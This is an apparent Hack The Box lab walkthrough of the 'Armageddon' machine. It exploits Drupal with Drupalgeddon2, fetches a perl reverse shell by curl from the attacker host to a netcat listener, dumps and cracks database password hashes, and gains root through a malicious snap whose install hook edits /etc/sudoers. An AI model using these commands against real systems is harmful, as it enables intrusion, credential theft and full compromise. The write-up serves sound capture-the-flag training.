https://github.com/Hackplayers/hackthebox-writeups/blob/master/machines/Armageddon/HTB_Armageddon-d0n601.pdf

By Ryan Kozak - 2021/06/10

1. Info Gathering 
2. Exploitation

Easy Level Box
Drupal Exploit
Box Name : Druppalgeddon2
Enum MySQL
Credential Stuffing > User Priv.
Priv Esc through Snap


1. Info Gathering
1.1  Nmap
Recon :
```nmap
sudo ./nmapAutomator.sh 10.10.10.233 All
```

Result: Open Ports  P22 and P80

1.2 View P80
1.2.1 look at CHANGELOG.txt to view version changes

```c
10.10.10.233:80/CHANGELOG.TXT

Drupal 7.56
```

1.3 Searchsploit drupal
1.3.1 Version 7.58 and below : exploit Drupalegeddon2.
Drupalgeddon2 a RCE

Path: php/webapps/44449.rb

2.0 Exploit
2.1 set 10.10.10.233 hostname to armageddon.htb in /etc/hosts

```r
/etc/hosts
...
10.10.10.233 armageddon.htb
```
2.1 download 44449.rb

https://www.exploit-db.com/exploits/44449

2.2 Run Ruby script(44449.rb)
2.2.1 requires Ruby dependencies. 
```ruby
sudo gem install highline
```

```r
$ruby 44449.rb http://armageddon.htb 

>> armageddon.htb >> whoami
>> apache
>> (cont. 2.2.4 below VVV)
```
Perl shell works better.

```C#
sudo service apache2 start
```
2.2.1.1 Start Apache2 Server from the offensive Computer


2.2.2 change perl reverse Shell IP

https://github.com/pentestmonkey/perl-reverse-shell/blob/master/perl-reverse-shell.pl

change script:  IP and port to "attacking IP" : 443

```C
sudo cp /usr/share/webshells/perl-reverse-shell.pl /var/www/html/perl-reverse-shell.pl

sudo vim perl-reverse-shell.pl

# Where to send the reverse shell.  Change these.
my $ip = '10.10.14.3'; #attacking IP
my $port = 443;
```

2.2.3 Start Netcat Listener on 10.10.14.3: 443

```R
sudo nc -lvnp 443
```

2.2.4 Download perl reverse shell from victim 44449.rb reverse-shell

```c
>> armageddon.htb>> curl http://10.10.14.3/perl-reverse-shell.pl --output shell.pl
>>(downloads)
>> armageddon.htb>>perl shell.pl
```

2.2.5 Attacker catches Shell
```R
$sudo nc -lvnp 443
listening on [any] 443...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.233] 34110
USER
Linux armageddon.htb
```
Drupal app is compromised.

2.2.6 Examine settings.php file
to view DB credentials
[C:\programs\xampp\htdocs\drupal\sites\default\1settings.php]  
 [http://mysite.com/sites/default/settings.php]

```r
$database = array (
	'default'=> array (
		'default'=> array (
			'database' => 'drupal'
			'username' => 'drupaluser'
			'password' = > 'P@ssw0rd'
			'host' => 'localhost'
			'driver' => 'mysql'
			)
		)
);
```


2.2.7 Connect to MySQL with new Credentials

```R
$mysql -u username -pPASSWORD -h HOSTNAMEORIP DATABASENAME 
```
cmd 
```R
mysql -u username -p DATABASENAME
```

```r
apache 4.2
$ mysql -u drupaluser -p drupal
mysql -u drupaluser -p drupal
Enter password : P@ssw0rd

select * from users;

uid

brucetherealadmin hash*long1
```
dumps users table and password hashes


2.2.8 crack the hash

Johntheripper
rockyou.txt

```R
$nano armageddon.hash
brucetherealadmin hash*long1

$john -wordlist:rockyou.txt armageddon.hash
```

```c
cracked 
'brucetherealadmin:hash*long1' =>> 'brucetherealadmin:booboo'

```

2.2.9 ssh into drupal with new Credential.

```R
$ssh brucetherealadmin@armgageddon.htb
brucetherealadmin@armgageddon.htb password : booboo

[brucetherealadmin@armgageddon.htb ~]
$cat ~/user.txt
"user FLAG"
```

2.2.10 Root Flag

can execute sudo snap packages, without password.
```C
[brucetherealadmin@armgageddon.htb ~]
sudo /usr/bin/snap install *
```
exploit with malicious snap packages

2.2.11.1 install FPM
```c
$sudo gem install --no-document fpm
```

2.2.11.2 craft packet
https://gtfobins.github.io/gtfobins/snap/
"id" change to 


```R
$COMMAND="echo 'brucetherealadmin ALL=(ALL) NOPASSWD:/binbash'>> /etc/sudoers"
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta

Created package {:path=>"xxxx_1.0_all.snap"}

$sudo mv xxxx_1.0_all.snap /var/www/html/oh.snap
```
1. craft package
2. add bruce to no sudoers
3. generate snap package with fpm
4. mv to on.snap in apache2 home directory


2.2.12Download package from victim SSH
```r
[brucetherealadmin@armgageddon.htb ~]
$ curl 10.10.14.3/oh.snap --output oh.snap

$sudo /usr/bin/snap install oh.snap --dangerous --devmode

$sudo /bin/bash

[root@armageddon brucetherealadmin]# cat /root/root.txt
ROOT FLAG

#ifconfig
#id
```

download oh.snap, install, root achieved. 


DONE.